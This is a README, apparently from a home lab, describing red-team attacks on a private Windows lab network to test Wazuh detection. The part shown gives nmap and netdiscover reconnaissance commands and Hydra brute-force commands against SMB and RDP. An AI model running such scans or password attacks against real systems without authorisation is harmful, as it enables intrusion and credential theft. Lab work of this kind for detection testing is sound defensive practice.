#  Red Team — Enterprise Cybersecurity Lab

This section documents simulated attacks executed against an enterprise environment using Kali Linux. These scenarios reflect common tactics from adversaries, including brute-force, remote code execution, and lateral movement. The goal is to demonstrate real-world offensive techniques and validate their detection by Blue Team tools such as **Wazuh**.

---

##  Lab Environment

| Hostname      | Role              | OS             | IP Address |
|---------------|-------------------|----------------|------------|
| kali-attacker | Red Team Attacker | Kali Linux     | 10.0.0.50  |
| client-win    | Workstation       | Windows 11     | 10.0.0.101 |
| win-server    | Domain Controller | Windows Server | 10.0.0.10  |

---

##  Objectives

- Simulate real-world attack paths on Windows infrastructure.
- Test the visibility and detection capabilities of Wazuh.
- Document MITRE ATT&CK mappings for each step.
- Propose defensive strategies based on findings.

---

##  Attack Scenarios

### 1. Network Reconnaissance

**Tools**: `netdiscover`, `nmap`  
**Purpose**: Identify live hosts, open ports, and OS fingerprints.

bash
netdiscover -r 10.0.0.0/24
nmap -sS -sV -O -T4 10.0.0.0/24

2. SMB & RDP Brute Force
Tool: Hydra
Target: client-win
Protocols: SMB & RDP
Wordlists: SecLists

bash
Copy
Edit
hydra -L users.txt -P passwords.txt smb://10.0.0.101
hydra -L users.txt -P passwords.txt rdp://10.0.0.101
